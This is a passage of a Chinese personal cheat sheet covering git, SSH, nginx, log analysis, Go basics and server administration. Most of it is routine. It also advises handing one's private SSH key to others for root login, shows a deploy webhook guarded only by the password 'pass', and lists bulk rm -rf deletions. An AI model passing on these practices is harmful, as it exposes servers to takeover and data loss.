06:46 - 07:00 (00:14)alvin pts/0 223.104.***.** Wed Nov 28 20:45 - 22:27 (01:42)[alvin@VM_0_16_centos ~]$ sudo pkill -kill -t pts/3#harry用户已经被踢除了[alvin@VM_0_16_centos ~]$ w 17:04:37 up 29 days, 6:44, 5 users, load average: 0.00, 0.01, 0.05USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATalvin pts/0 116.199.102.65 07:25 5.00s 0.12s 0.00s wroot pts/1 116.199.102.65 11:05 5:59m 0.02s 0.02s -bashalvin pts/2 116.199.102.65 11:05 5:59m 0.04s 0.05s sshd: alvin [priv]kate pts/4 116.199.102.65 11:08 5:12m 11.94s 11.91s topalvin pts/5 116.199.102.65 11:53 5:10m 0.02s 0.02s -bash 回到远程仓库的状态1git fetch --all &amp;&amp; git reset --hard origin/master 重设第一个commit1git update-ref -d HEAD 删除已经合并到master的分支1git branch --merged master | grep -v '^\*\| master' | xargs -n 1 git branch -d 展示本地分支关联远程仓库的情况123git branch -vvai_notice 6fa631e7 Merge branch 'master' into ai_notice delete_msg 33fc3808 Merge branch 'master' into delete_msg 关联远程分支12git branch -u origin/mybranchgit push origin/mybranch -u 列出所有远程分支1git branch -r 列出本地和远程分支1git branch -a 从远程分支中创建并切换到本地分支1git checkout -b &lt;branch-name&gt; origin/&lt;branch-name&gt; 删除远程分支1234git push origin --delete &lt;remote-branchname&gt;或者git push origin :&lt;remote-branchname&gt; 重命名本地分支1git branch -m &lt;new-branch-name&gt; 切回到某个标签1git checkout -b branch_name tag_name 放弃工作区的修改1234git checkout &lt;file-name&gt;放弃所有修改：git checkout . 修改远程仓库的url1git remote set-url origin &lt;URL&gt; 查看两个星期内的改动1git whatchanged --since='2 weeks ago' 展示简化的commit历史1git log --pretty=oneline --graph --decorate --all 展示任意分支某一文件的内容1git show &lt;branch-name&gt;:&lt;file-name&gt; clone下来指定的单一分支1git clone -b &lt;branch-name&gt; --single-branch https://github.com/user/repo.git 忽略某个文件的改动123456关闭 track 指定文件的改动，也就是 Git 将不会在记录这个文件的改动git update-index --assume-unchanged path/to/file恢复 track 指定文件的改动git update-index --no-assume-unchanged path/to/file 在commit log中查找相关内容1git log --all --grep='&lt;given-text&gt;' 搭建Git服务器123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104https://coffeephp.com/articles/3$ sudo yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel perl-devel$ sudo yum install git$ sudo adduser git$ cd /home/git$ mkdir .ssh &amp;&amp; chmod 700 .ssh$ touch .ssh/authorized_keys &amp;&amp; chmod 600 .ssh/authorized_keys$ sudo chown -R git:git .ssh客户端上生成密钥#$ cd ~$ ssh-keygen -t rsa $ scp ~/.ssh/id_rsa.pub root@server_ip:/home/git/.ssh/authorized_keys $ mkdir /home/git/repo/ $ sudo chown git:git /home/git/repo/ $ cd /home/git/repo/ $ sudo git init --bare sample.git $ sudo chown -R git:git sample.git $ git clone git@118.24.158.116/:/home/git/repo/sample.git sample $cd sample $ touch index.html $ git add index.html $ git commit index.html -m 'first commit' $ git push origin master Enumerating objects: 3, done. Counting objects: 100% (3/3), done. Writing objects: 100% (3/3), 209 bytes | 209.00 KiB/s, done. Total 3 (delta 0), reused 0 (delta 0) To 118.24.158.116:/home/git/repo/sample.git * [new branch] master -&gt; master创建网站的目录#$ sudo mkdir /var/www/sample -p$ sudo chown -R git:git /var/www/sample设置git钩子#$ cd /home/git/repo/sample.git/hooks$ sudo vim post-receive写入以下内容：#!/bin/shGIT_WORK_TREE=/var/www/sample git checkout -f写入权限$ sudo chmod +x post-receive[root@VM_0_14_centos hooks]# ll /var/www/sample/total 4-rw-rw-r-- 1 git git 5 Jan 9 14:23 index.html$ ssh git@118.24.158.116Last failed login: Wed Jan 9 09:38:59 CST 2019 from 219.246.78.17 on ssh:nottyThere were 264 failed login attempts since the last successful login.[git@VM_0_14_centos ~]$ lltotal 4drwxr-xr-x 3 git git 4096 Jan 9 14:16 repo[git@VM_0_14_centos ~]$ ll repo/total 4drwxr-xr-x 7 git git 4096 Jan 9 14:23 sample.git[git@VM_0_14_centos ~]$ ll repo/sample.git/total 36drwxr-xr-x 2 git git 4096 Jan 9 14:16 branches-rw-r--r-- 1 git git 66 Jan 9 14:16 config-rw-r--r-- 1 git git 73 Jan 9 14:16 description-rw-r--r-- 1 git git 23 Jan 9 14:16 HEADdrwxr-xr-x 2 git git 4096 Jan 9 14:21 hooks-rw-rw-r-- 1 git git 112 Jan 9 14:23 indexdrwxr-xr-x 2 git git 4096 Jan 9 14:16 infodrwxr-xr-x 10 git git 4096 Jan 9 14:23 objectsdrwxr-xr-x 4 git git 4096 Jan 9 14:16 refs[root@VM_0_14_centos hooks]# cat /etc/shells/bin/sh/bin/bash/sbin/nologin/usr/bin/sh/usr/bin/bash/usr/sbin/nologin/bin/tcsh/bin/csh/usr/bin/fish$ which git-shell # make sure git-shell is installed on your system./usr/bin/git-shell$ sudo vim /etc/shells # and add the path to git-shell from last command使用 chsh 命令修改任一系统用户的 shell$ sudo chsh git # and enter the path to git-shell, usually: /usr/bin/git-shellChanging shell for git.New shell [/bin/bash]: /usr/bin/git-shellShell changed.这样，用户 git 就只能利用 SSH 连接对 Git 仓库进行推送和拉取操作，而不能登录机器并取得普通 shell。 如果试图登录，你会发现尝试被拒绝，像这样：$ ssh git@118.24.158.116Last login: Wed Jan 9 14:29:56 2019 from 218.30.113.34fatal: Interactive git shell is not enabled.hint: ~/git-shell-commands should exist and have read and execute access.Connection to 118.24.158.116 closed. 查看定时任务日志12345默认位于 /var/log/cron 文件：tail -f /var/log/croncat /var/log/cron | grep "sh" GitHub API limit12345GitHub API limit (0 calls/hr) is exhausted, could not fetch https://api.github.com/graphql. Create a GitHub OAuth token to go over the API rate limit. You can also wait until 2019-01-25 09:36:32 for the rate limit to reset.Head to https://github.com/settings/tokens/new?scopes=repo&amp;description=Composer+on+BJ-D-212361A+2019-01-25+0835to retrieve a token. It will be stored in "C:/Users/xxx/AppData/Roaming/Composer/auth.json" for future use by Composer.Token (hidden): 在Git中添加忽略文件如果文件已经添加到缓存区了// 移除file1git reset HEAD file1// 移除全部https://blog.tedxiong.com/add_ingore_file_for_git.htmlgit reset HEAD *//如果有多个文件可以使用通配符git rm –cached FILENAME添加忽略文件touch .gitignoreecho ‘file1’ &gt;&gt; .gitignoreecho ‘build/‘ &gt;&gt; .gitignore配置全局的忽略文件git config –global core.excludesfile ~/.gitignore_global添加例外如果不想跟别人分享.gitignore文件，可以在.git/info/exclude中配置规则。 一键提交脚本1234567vi push.shtime=`date "+%Y-%m-%d_%H-%M-%S"`who=`hostname'git add --allgit commit -m "$&#123;who&#125; push @ $&#123;time&#125;"git push origin masterecho "Finished Push" 免密登录1234567891011121314151617181920212223242526272829303132333435ssh-keygen -t rsassh-copy-id -i/Users/USERNAME/.ssh/id_rsa.pub root@iptouch authorized_keyschmod 600 /root/.ssh/authorized_keyscat /root/.ssh/id_rsa.pub &gt;&gt; /root/.ssh/authorized_keysssh root@ip如果此时想让其他人也免密登录 可以把本地的id_rsa 文件拷贝给别人 执行命令ssh -i id_rsa root@ip vim /etc/ssh/sshd_configRSAAuthentication yesPubkeyAuthentication yesAuthorizedKeysFile %h/.ssh/authorized_keysPasswordAuthentication no #修改之前一定要确认你的秘钥可以正常使用重启ssh配置生效service sshd restart从服务器下载[username@host ~]$ cd ~/.ssh[username@host ~]$ ssh-keygen // 一路回车[username@host ~]$ cat id_rsa.pub &gt;&gt; authorized_keys[username@host ~]$ chmod 600 authorized_keys[username@host ~]$ chmod 700 ~/.ssh// 下载私钥[local@host ~]$ sudo scp -i USERNAME@HOST /usr/USERNAME/.ssh/id_rsa /LOCAL_PATH/id_rsa// 测试秘钥登录sudo ssh USERNAME@HOST -i /LOCAL_PATH/id_rsa 最近24小时修改过的文件find / -mtime -1 修改 hostnamehostname syyong # 临时修改 hostname 为 syyongvi /etc/sysconfig/network –&gt; HOSTNAME = syyong # 永久修改 hostname 为syyong 查找文件12345678find /etc/ -name httpd.conf # 在 /etc 目录下查找文件名为 httpd.conffind /etc/ -name http* # 在 /etc目录下以 httpd 开头的文件find /root/ -size +10M # 在 /root 目录下大于 10M 的文件find /home/ -user syyong # 在 /home 目录下查找所有者是 syyongfind ./ -user syyong -exec rm -rf&#123;&#125;\ # 在当前目录下把找到所有者是 syyong 的用户的文件删除掉find /etc -cmin -5 # 在 /etc 目录下查找5分钟内修改过属性的文件和目录find /etc -size +163840 -a -size -204800 # 在 /etc 目录下查找大于 80M 小于 100M 的文件find .|xargs grep -ri "lnmp" # 在当前目录下查找含 lnmp 字符的文件 ssh12ssh -p 22 syyong@192.168.1.2 # 通过 ssh 通过账号密码登录到 192.168.1.2 服务器ssh -i ./ssh-key.pem syyong@192.168.1.2 # 通过 ssh 通过证书登录到 192.168.1.2 服务器 scp1234567891011121314151617181920212223242526272829303132333435363738394041scp -p 2202 /home/lnmp.tar.gz www@192.168.1.2:/home/ # 将文件 lnmp.tar.gz 同步到 192.168.1.2 服务器的 /home/ 目录下rsync -avzP /home/lnmp.tar.gz -e 'ssh -p 2202' www@192.168.1.2:/home/ # 将文件 lnmp.tar.gz 增量同步到 192.168.1.2 服务器的 /home/ 目录下touch file&#123;1..100&#125; # 批量创建 file1,file2...file100touch file&#123;a..z&#125; # 批量创建 filea,fileb...fileztouch file&#123;A..Z&#125; # 批量创建 fileA,fileB...fileZecho 'lnmp' &gt; lnmp.txt # 覆盖式写入 lnmp 到 lnmp.txt 文件中echo 'lnmp' &gt;&gt; lnmp.txt # 追加式写入 lnmp 到 lnmp.txt 文件中tar -xzvf syyong.tar.gz # 解压 gz 文件unzip syyong.zip -d /home # 解压 zip 文件到 /home 目录下tar -czvf syyong syyong.tar.gz # 将文件压缩成 gz 文件zip -r syyong.zip syyong # 压缩 syyong 目录为 zip 文件pkill php-fpm # 杀掉所有 php-fpm 进程killall php-fpm # 杀掉所有 php-fpm 进程netstat -tunpl|grep 80 # 查看端口使用情况tcpdump -i eth0 # 监听eth0网卡数据rpm -q xxx # 查看 xxx 软件是否已安装rpm -qa # 查看已安装了的所有的 rpm 包rpm -ivh /home/xxx.rpm # 按路径安装 xxx.rpm 软件包并显示进度rpm -e xxx.rpm # 删除 xxx rpm 包yum install xxx # 安装 xxx 软件yum search xxx # 在 yum 仓库中查找 xxx 软件yum remove xxx # 卸载 xxx 软件init 0 # 关机init 1 # 进入单用户模式init 5 # 进入图形化登录界面 init 6 # 重启nohup php index.php # 以 nohup 方式运行 index.php 脚本，这样关闭终端操作不影响程序的继续运行time php index.php # 统计显示执行 index.php 脚本耗时情况curl -o /dev/null -s -w %&#123;time_namelookup&#125;::%&#123;time_connect&#125;::%&#123;time_starttransfer&#125;::%&#123;time_total&#125;::%&#123;speed_download&#125;"\n" "http://www.syyong.com" # 查看访问站点的 rtgrep -&gt; 过滤cut -&gt; 切割，从一个文本文件或者文本流中提取文本列sort -&gt; 命令对 File 参数指定的文件中的行排序，并将结果写到标准输出xargs -&gt; 读入 stdin 的数据，并且以空格符或断行字符作为分辨，将 stdin 的数据分隔成为 argumentsuniq -&gt; 去除重复行wc -&gt; 统计文件里面有多少单词，多少行，多少字符awk '&#123;print $0&#125;' 2016.log # 输出 2016.log 的每行数据awk '!arr[$1]++' 2016.log |wc -l # 统计 2016.log 中不重复的行的个数rz -bye # 会弹出文件窗口，选择本地要上传的文件即可上传sz file1 file2 # 下载 file1、file2 文件到本地yum install lrzsz # 安装 lrzsz 软件 netstat 命令查看连接数判断攻击1234567891011121314151617181920212223242526272829303132333435显示所有活动的网络连接。#netstat -na查看同时连接到哪个服务器IP比较多，cc攻击用。使用双网卡或多网卡可用。# netstat -an|awk '&#123;print $4&#125;'|sort|uniq -c|sort -nr|head查看哪些IP连接到服务器连接多，可以查看连接异常IP。#netstat -an|awk -F: '&#123;print $2&#125;'|sort|uniq -c|sort -nr|head显示所有80端口的网络连接并排序。这里的80端口是http端口，所以可以用来监控web服务。如果看到同一个IP有大量连接的话就可以判定单点流量攻击了。#netstat -an | grep :80 | sort 这个命令可以查找出当前服务器有多少个活动的 SYNC_REC 连接。正常来说这个值很小，最好小于5。 当有Dos攻击或的时候，这个值相当的高。但是有些并发很高的服务器，这个值确实是很高，因此很高并不能说明一定被攻击。#netstat -n -p|grep SYN_REC | wc -l 列出所有连接过的IP地址。#netstat -n -p | grep SYN_REC | sort -u 列出所有发送SYN_REC连接节点的IP地址。#netstat -n -p | grep SYN_REC | awk '&#123;print $5&#125;' | awk -F: '&#123;print $1&#125;'使用netstat命令计算每个主机连接到本机的连接数。#netstat -ntu | awk '&#123;print $5&#125;' | cut -d: -f1 | sort | uniq -c | sort -n 列出所有连接到本机的UDP或者TCP连接的IP数量。#netstat -anp |grep 'tcp|udp' | awk '&#123;print $5&#125;' | cut -d: -f1 | sort | uniq -c | sort -n 检查 ESTABLISHED 连接并且列出每个IP地址的连接数量。#netstat -ntu | grep ESTAB | awk '&#123;print $5&#125;' | cut -d: -f1 | sort | uniq -c | sort -nr 列出所有连接到本机80端口的IP地址和其连接数。80端口一般是用来处理HTTP网页请求。#netstat -plan|grep :80|awk &#123;'print $5'&#125;|cut -d: -f 1|sort|uniq -c|sort -nk 1 显示连接80 端口前10的ip，并显示每个IP的连接数。这里的80端口是http端口，所以可以用来监控web服务。如果看到同一个IP有大量连接的话就可以判定单点流量攻击了。#netstat -antp | awk '$4 ~ /:80$/ &#123;print $4" "$5&#125;' | awk '&#123;print $2&#125;'|awk -F : &#123;'print $1'&#125; | uniq -c | sort -nr | head -n 10 Linux 相关信息12345678910111213141516171819202122232425262728293031323334353637383940414243lsb_release -a # 查看操作系统版本https://liam.page/2016/11/06/Linux-Info-Cheatsheet/head -n 1 /etc/issue # 查看操作系统版本cat /proc/version # 查看操作系统内核信息uname -a # 查看操作系统内核信息、CPU 信息cat /proc/cpuinfo # 查看 CPU 信息hostname # 查看计算机名字env # 列出环境变量lsmod # 列出加载的内核模块uptime # 查看系统运行时间、负载、用户数量cat /proc/loadavg # 查看系统负载free -m # 查看物理内存和交换区的使用情况grep MemTotal /proc/meminfo # 查看内存总量grep MemFree /proc/meminfo # 查看空闲内存总量df -h # 查看各分区使用情况fdisk -l # 查看所有分区swapon -s # 查看所有交换分区hdparm -i /dev/hda # 查看 IDE 磁盘的参数dmesg | grep IDE # 查看系统启动时 IDE 磁盘的状态mount | column -t # 查看各分区的挂载状态du -sh &lt;目录名&gt; # 查看指定目录的大小ifconfig # 查看所有网络接口的属性iptables -L # 查看 iptables 防火墙route -n # 查看本机路由表netstat -lntp # 查看所有监听端口netstat -antp # 查看所有已建立的连接netstat -s # 查看网络统计信息w # 查看活动用户以及他们在做什么who # 查看活动用户id &lt;用户名&gt; # 查看用户的 ID、组信息cut -d: -f1 /etc/passwd # 查看系统中所有用户cut -d: -f1 /etc/group # 查看系统所有组cat &lt;filename&gt; | sort | uniq -d # 只显示重复的行，每行只显示一次 交集cat &lt;filename&gt; | sort | uniq -D # 只显示重复的行cat &lt;filename&gt; | sort | uniq -i # 忽略大小写cat &lt;filename&gt; | sort | uniq -u # 只显示只出现一次的行cat &lt;filename&gt; | sort | uniq -c # 统计每行重复的次数sort &lt;file1&gt; &lt;file2&gt; &lt;file2&gt; | uniq -u # 差集sort &lt;file1&gt; &lt;file2&gt; | uniq -u # 对称差集https://liam.page/2016/05/05/best-match-using-sort-and-uniq-to-do-set-operations/sort &lt;file1&gt; &lt;file2&gt; | uniq -d # 交集sort &lt;file1&gt; &lt;file2&gt; | uniq # 并集 反向代理以访问 Gist1234567891011121314151617181920server &#123; listen 80; server_name gist.example.com; access_log off; resolver 8.8.8.8; location / &#123; proxy_pass https://gist.github.com; proxy_cache_valid 200 302 1h; proxy_cache_valid 404 1m; proxy_cache_use_stale error timeout invalid_header updating http_500 http_502 http_503 http_504; proxy_set_header Accept-Encoding ""; proxy_set_header Accept-Language "zh-CN"; proxy_set_header User-Agent $http_user_agent; sub_filter https://gist-assets.github.com/ http://gist.example.com; sub_filter https://gist.github.com/ http://gist.example.com; sub_filter_once off; &#125;&#125;访问 http://gist.example.com 就相当于访问了 https://gist.github.com。https://liam.page/2015/09/07/reverse-proxy-to-get-access-to-gist/ 文件名大小写有问题12345678910111213141516方案一：删除旧文件，提交代码。添加新文件，提交代码。方案二：修改配置git config core.ignorecase false方案三：$ git mv test.txt tmp.txt$ git mv tmp.txt Test.txt$ git commit -m "Renamed test.txt to Test.txt"找出请求次数最多的前50个IP：awk '&#123;print $1&#125;' /path/to/web-server-log/access.log | sort|uniq -c | sort -nr | head -n 50 paste 命令支持输入多个文件1234567891011121314151617$ paste -d '|' paste2.txt paste1.txt paste3.txta|1|Ab|2|Bc|3|C$ whoLiam :0 2016-11-08 00:07Liam pts/0 2016-11-08 00:23 (:0.0)Liam pts/1 2016-11-08 00:15 (:0.0)$ who | tr -s ' 'Liam :0 2016-11-08 00:07Liam pts/0 2016-11-08 00:23 (:0.0)Liam pts/1 2016-11-08 00:15 (:0.0)使用 -s 参数，可以逐行地将连续的字符 unique 成单独的一个字符。$ who | tr -s ' ' | cut -d ' ' -f 1,3,4Liam 2016-11-08 00:07Liam 2016-11-08 00:23Liam 2016-11-08 00:15 Git webhook12345678910111213141516171819202122232425262728293031//http://blog.text.wiki/2017/10/31/git-webhooks-for-php.html设置用于接收请求的 URL。服务器收到 push、pull request、merge、tag 等操作时，会将相应信息发送给步骤 1 里的 URL。URL 对应的程序收到网络请求后，执行自动部署、邮件通知等操作。部署 SSH 无密码登录 GitHub 为例，在 Settings -&gt; Deploy keys，选择 Add deploy key.&lt;?php$raw_data = file_get_contents("php://input");$pay_load = json_decode($raw_data,true);//监测请求来源合法性，if($pay_load['password'] != 'pass')&#123; exit('ok 400');&#125;//检查是否为master分支if($pay_load["ref"] != "refs/heads/master")&#123; exit('ok 401');&#125;exec('sh /var/www/hooks/build.sh');#! /bin/bashSITE_PATH='/var/www/weixinbook'USER='www-data'USERGROUP='www-data'cd $SITE_PATHgit reset --hard origin/mastergit clean -fgit pullgit checkout masterchown -R $USER:$USERGROUP $SITE_PATH 删除某个文件的所有历史记录123$ git filter-branch -f --tree-filter 'rm -rf common/service/SyncBlogServince.php' HEAD$ git push origin --forcehttp://www.54php.cn/default/90.html 批量kill进程1ps -ef|grep 'python' |grep -v grep| awk '&#123;print $2&#125;’ | xargs kill -9 nginx日志按日期切割并保留最近七天的日志123456789101112131415161718#!/bin/bash## 零点执行该脚本https://www.einsition.com/article/5/details## Nginx 日志文件所在的目录LOGS_PATH="/www/log/nginx"mkdir -p $&#123;LOGS_PATH&#125;/backup/mv $&#123;LOGS_PATH&#125;/api.einsition.com-access.log $&#123;LOGS_PATH&#125;/backup/api.einsition.com-access_$(date -d "yesterday" +"%Y%m%d").logmv $&#123;LOGS_PATH&#125;/api.einsition.com-error.log $&#123;LOGS_PATH&#125;/backup/api.einsition.com-error_$(date -d "yesterday" +"%Y%m%d").log## 向 Nginx 主进程发送 USR1 信号。USR1 信号是重新打开日志文件# nginx_pid=`ps -ef |grep -v grep |grep "nginx: master process"|awk -F" " '&#123;print $2&#125;'`# kill -USR1 $nginx_pidkill -USR1 $(cat /run/nginx.pid)cd $&#123;LOGS_PATH&#125;/backup/find . -name "*.einsition.com*.log" -type f -mtime +7 -exec rm -f &#123;&#125; \; 检测端口是否打开123456789101112yum install -y nc[root@su html]# nc -v www.buyao.bid 5050Ncat: Version 7.50 ( https://nmap.org/ncat )Ncat: Connected to 38.143.1.156:5050.[root@su html]# nc -v baidu.com 8123Ncat: Version 7.50 ( https://nmap.org/ncat )Ncat: Connection to 123.125.115.110 failed: Connection timed out.Ncat: Trying next address...♥[root@su html]# nc -v baidu.com 443Ncat: Version 7.50 ( https://nmap.org/ncat )Ncat: Connected to 123.125.115.110:443. Composer 设置忽略版本匹配123456789101112131415161718vagrant@homestead:/usr/share/nginx/html/laravel-blog$ sudo composer installLoading composer repositories with package informationInstalling dependencies (including require-dev) from lock fileYour requirements could not be resolved to an installable set of packages.Problem 1- Installation request for doctrine/instantiator 1.0.3 -&gt; satisfiable by doctrine/instantiator[1.0.3].- doctrine/instantiator 1.0.3 requires php ~5.3 -&gt; your PHP version (7.0.3) does not satisfy that requirement.Problem 2- doctrine/instantiator 1.0.3 requires php ~5.3 -&gt; your PHP version (7.0.3) does not satisfy that requirement.- phpunit/phpunit-mock-objects 2.3.0 requires doctrine/instantiator ~1.0,&gt;=1.0.1 -&gt; satisfiable by doctrine/instantiator[1.0.3].- Installation request for phpunit/phpunit-mock-objects 2.3.0 -&gt; satisfiable by phpunit/phpunit-mock-objects[2.3.0].提示我的PHP 7版本太高，不符合composer.json需要的版本，但是在PHP 7下应该也是可以运行的，composer可以设置忽略版本匹配，命令是：解决方案https://blog.fastrun.cn/2016/05/05/1-24/composer install --ignore-platform-reqsorcomposer update --ignore-platform-reqs linux12345678910111213统计 IP 连接数$ netstat -ntu | awk '&#123;print $5&#125;' | cut -d: -f1 | sort | uniq -c | sort -rn | head -10# 当前用户$ whoamiroot# 当前所有用户$ ps -ef | grep 'pts'root 4752 4727 0 00:09 pts/0 00:00:00 su wwwwww 4755 4752 0 00:09 pts/0 00:00:00 bash剔除非法登陆用户：https://www.fanhaobai.com/2018/01/linux-skill.html$ kill -9 4755 深入 Nginx 之配置篇12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758user admin; #配置用户或者组。worker_processes 4; #允许生成的进程数，默认为1 pid /nginx/pid/nginx.pid; #指定 nginx 进程运行文件存放地址 error_log log/error.log debug; #错误日志路径，级别。http &#123; include mime.types; #文件扩展名与文件类型映射表 default_type application/octet-stream; #默认文件类型，默认为text/plain access_log off; #取消服务日志 sendfile on; #允许 sendfile 方式传输文件，默认为off，可以在http块，server块，location块。 sendfile_max_chunk 100k; #每个进程每次调用传输数量不能大于设定的值，默认为0，即不设上限。 keepalive_timeout 65; #连接超时时间，默认为75s，可以在http，server，location块。 server &#123; keepalive_requests 120; #单连接请求上限次数。 listen 80; #监听端口 server_name 127.0.0.1; #监听地址 index index.html index.htm index.php; root your_path; #根目录 location ~ \.php$ &#123; fastcgi_pass unix:/var/run/php/php7.1-fpm.sock; #fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi_params; &#125; &#125;&#125;upstream test-upstream &#123; ip_hash; # 使用 ip_hash 算法分配 https://learnku.com/articles/24795#topnav server 192.168.1.1; # 要分配的 ip server 192.168.1.2; &#125; server &#123; location / &#123; proxy_pass http://test-upstream; &#125; &#125; nginx日志中提取5分钟内访问状态非200的记录12345678910111213141516nginx部分访问日志如下：100.0.0.16 - - [27/Aug/2015:10:44:58 +0000] GET www HTTP/1.1 “200” 15 “-” “-” “-” “3.254” “192.168.1.1:80”100.0.1.13 - - [27/Aug/2015:10:45:22 +0000] GET www HTTP/1.1 “200” 90 “-” “-” “-” “0.498” “192.168.1.1:80”100.0.1.13 - - [27/Aug/2015:10:46:26 +0000] GET www HTTP/1.1 “200” 90 “-” “-” “-” “1.704” “192.168.1.1:80”100.0.1.16 - - [27/Aug/2015:10:46:35 +0000] GET www HTTP/1.1 “200” 94 “-” “-” “-” “1.189” “192.168.1.1:80”采用awk多分隔符实现awk -F'[/ "]' '$6&gt;="2015:10:44:00" &amp;&amp; $6&lt;="2015:10:49:00" &amp;&amp; $13 != 200'分析2015/8/15 到 2015/8/16 访问"/index.php?g=Member&amp;m=Public&amp;a=sendValidCode"的IP倒序排列cat log_file | egrep '15/Aug/2015|16/Aug/2015' | awk '&#123;if($7 == "/index.php?g=Member&amp;m=Public&amp;a=sendValidCode") print $1,$7&#125;'|sort|uniq -c|sort -nr golang入门123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142var b []intnumbers := make([]int,5,10)// 创建切片number2 := make([]int, 15)// 将原始切片复制到新切片copy(number2, number)// 初始化长度为 4，以及赋值number2 := []int&#123;1,2,3,4&#125;fmt.Println(numbers) // -&gt; [1 2 3 4]// 创建子切片slice1 := number2[2:]fmt.Println(slice1) // -&gt; [3 4]slice2 := number2[:3]fmt.Println(slice2) // -&gt; [1 2 3]slice3 := number2[1:4]fmt.Println(slice3) // -&gt; [2 3 4]if num := 9; num &lt; 0 &#123; fmt.Println(num, "is negative")&#125; else if num &lt; 10 &#123; fmt.Println(num, "has 1 digit")&#125; else &#123; fmt.Println(num, "has multiple digits")&#125;var ap *int ap 是指向整数类型的指针。＆ 运算符可用于获取变量的地址。 a := 12 ap = &amp;a 可以使用 * 运算符访问指针指向的值： fmt.Println(*ap) // =&gt; 12 func increment(i *int) &#123; *i++ &#125; func main() &#123; i := 10 increment(&amp;i) fmt.Println(i) &#125; //=&gt; 11 func add(a int, b int) int &#123; c := a + b return c &#125; func add(a int, b int) (c int) &#123; c = a + b return &#125; func add(a int, b int) (int, string) &#123; c := a + b return c, "successfully added" &#125; type person struct &#123; name string age int gender string &#125; //方式1：指定属性和值 p = person&#123;name: "Bob", age: 42, gender: "Male"&#125; //方式2：指定值 person&#123;"Bob", 42, "Male"&#125; p.name //=&gt; Bob pp = &amp;person&#123;name: "Bob", age: 42, gender: "Male"&#125; pp.name //=&gt; Bob //定义结构体type person struct &#123; name string age int gender string&#125;// 方法定义func (p *person) describe() &#123; fmt.Printf("%v is %v years old.", p.name, p.age)&#125;func (p *person) setAge(age int) &#123; p.age = age&#125;func (p person) setName(name string) &#123; p.name = name&#125;func main() &#123; pp := &amp;person&#123;name: "Bob", age: 42, gender: "Male"&#125; pp.describe() // =&gt; Bob is 42 years old pp.setAge(45) fmt.Println(pp.age) //=&gt; 45 pp.setName("Hari") fmt.Println(pp.name) //=&gt; Bob&#125;Go 的接口是一系列方法的集合。接口有助于将类型的属性组合在一起 结构体是不同字段的类型集合。 结构用于将数据分组在一起。type animal interface &#123; description() string&#125;type cat struct &#123; Type string Sound string&#125;type snake struct &#123; Type string Poisonous bool&#125;func (s snake) description() string &#123; return fmt.Sprintf("Poisonous: %v", s.Poisonous)&#125;func (c cat) description() string &#123; return fmt.Sprintf("Sound: %v", c.Sound)&#125;func main() &#123; var a animal a = snake&#123;Poisonous: true&#125; fmt.Println(a.description()) a = cat&#123;Sound: "Meow!!!"&#125; fmt.Println(a.description())&#125;godoc person Description 它将会为我们的 person 包内部的 Description 函数生成文档。查看文档的话只需要使用如下命令启动一个 web 服务器就可以： godoc -http=":8080" 现在去访问这个 URL http://localhost:8080/pkg/ 然后你就可以看到我们刚创建的包文档了。func main()&#123; resp, err := http.Get("http://example.com/") if err != nil &#123; fmt.Println(err) return &#125; fmt.Println(resp)&#125;https://learnku.com/golang/t/24715#reply83037 linux chmod123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354777 --- 代表所有人都有最高权限755 --- 执行文件的常用权限644 --- 普通文件的常用权限关于为什么有文件的写权限，却不能删除文件的问题解释对于某个目录或文件拥有的w权限，针对的是里面的内容，而不是文件本身由此，对文件的删除是对文件所在目录的写，故必须有目录的写权限才可以对文件来讲： 最高权限是 x（执行）对目录来讲： 最高权限是 w（写）具有修改目录结构的权限。如新建文件和目录，删除此目录下文件和目录，重命名此目录下文件和目录，剪切针对目录755是最常用的权限设定方式，（目录所有者可以删除和创建目录下文件，其他人只能进入看看）稍微严谨一点是750，其他人进都进不来极端严谨一点是700，就我自己能进能看能改，其他所有拒之门外针对普通文件644是最常用的权限设定方式，（文件所有者能看能改，其他人只能看）640是其他人不能看不能改600是其他所有人不能看不能改针对可执行文件754是最常用的权限设定方式，（文件所有者可以看改执行，组内可以执行，其他人只能看）750、740、700都是可以的还有一点文件所有者必须为7或者是6，要不就是傻逼 https://learnku.com/articles/22095#topnav通过 kill ps -ef | grep 'ddd' https://learnku.com/articles/21339#topnav这种形式，这个时候实际上等同于拼接字符串得到的命令，其效果类似于 kill $pidfor procid in $(ps -aux | grep "some search" | awk '&#123;print $2&#125;'); do kill -9 $procid; done其实与第一种原理一样，只不过需要多次kill的时候是循环处理的，每次处理一个ps -ef | grep 'ddd' | xargs killecho '11@22@33@44@55@66@77@88@99@00' | xargs -d '@' -n 3 echo输出结果：11 22 3344 55 6677 88 9900find的输出结果是每条记录后面加上换行，也就是每条记录是一个新行find . -name "*.txt" -print0输出：./2.txt./3.txt./1.txt =&gt; 加上 -print0 参数表示find输出的每条结果后面加上 '\0' 而不是换行find . -name "*.txt" -print0 | xargs -0 echo输出：./2.txt ./3.txt ./1.txt nginx 配置1234567891011121314151617181920212223242526272829303132禁止空主机头和未授权域名访问$ vim conf.d/default.confserver &#123; listen 80 default; server_name _; return 500;&#125;$ vim vhosts/blog.yiranzai.cn.confserver &#123; listen 80; server_name blog.yiranzai.cn; location / &#123; proxy_pass http://127.0.0.1:88; include /etc/nginx/proxy.conf; #代理配置 &#125;&#125;$ vim proxy.confproxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;$ firewall-cmd --zone=public --add-port=80/tcp --permanentsuccess$ firewall-cmd --reloadsuccesssystemctl start nginx.service #启动nginxsystemctl enable nginx.service #将nginx开机启动systemctl stop nginx.service #停止nginx服务systemctl reload nginx.service #重新加载nginx配置（推荐）systemctl restart nginx.service #重启nginx服务（不推荐，会关闭所有进程）php-fpm fastcgi_finish_request() - 特殊功能：用于在请求完成和刷新数据后，继续在后台执行耗时的工作（录入视频转换、统计处理等）； svn搭建1234567891011121314151617181920212223242526272829303132333435yum install -y subversion$ mkdir /var/www/svn$ cd /var/www/svn$ svnadmin create 